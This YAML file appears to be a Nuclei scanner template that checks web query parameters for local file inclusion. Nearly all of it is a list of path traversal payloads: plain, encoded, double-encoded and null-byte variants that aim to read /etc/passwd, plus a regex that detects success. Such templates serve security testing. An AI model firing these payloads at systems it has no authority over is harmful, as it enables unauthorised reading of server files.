http:
- fuzzing:
  - fuzz:
    - '{{reflection}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    reflection:
    - /etc/passwd
    - L2V0Yy9wYXNzd2Q=
    - ../../../../../../etc/./passwd%00
    - ../../../../../../etc//passwd%00
    - ../../../../../etc/passwd
    - ../et*/pas**d
    - ../../../../../../../..//etc/passwd%00
    - .%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd
    - ../../../../../../../../../../../../etc/passwd
    - ../../../../../../../../../etc/passwd%00
    - file:///etc/passwd
    - file:/etc/passwd
    - '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd'
    - //////////////////../../../../../../../../etc/passwd
    - ../../../etc/passwd
    - ../../../etc/passwd%00
    - '%252e%252e%252fetc%252fpasswd'
    - '%252e%252e%252fetc%252fpasswd%00'
    - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
    - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00'
    - '....//....//etc/passwd'
    - ..///////..////..//////etc/passwd
    - /%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
    - ../../../../../../../../../../../../../../../../../../../../../../etc/passwd
    - ../../../../../../../../../../../../../../../../../../../../../etc/passwd
    - ../../../../../../../../../../../../../../../../../../../../etc/passwd
    - ../../../../../../../../../../../../../../../../../../../etc/passwd
    - ../../../../../../../../../../../../../../../../../../etc/passwd
    - ../../../../../../../../../../../../../../../../../etc/passwd
    - ../../../../../../../../../../../../../../../../etc/passwd
    - ../../../../../../../../../../../../../../../etc/passwd
    - ../../../../../../../../../../../../../../etc/passwd
    - ../../../../../../../../../../../../../etc/passwd
    - ../../../../../../../../../../../etc/passwd
    - ../../../../../../../../../../etc/passwd
    - ../../../../../../../../../etc/passwd
    - ../../../../../../../../etc/passwd
    - ../../../../../../../etc/passwd
    - ../../../../../../etc/passwd
    - ../../../../etc/passwd
    - ../../etc/passwd
    - ../etc/passwd
    - /./././././././././././etc/passwd
    - /../../../../../../../../../../etc/passwd
  stop-at-first-match: true
id: linux-lfi-automation
info:
  author: rix4uni
  description: Checks for Local File Inclusion vulnerabilities
  name: LFI Vulnerability Check
  severity: critical
  tags: lfi,linux
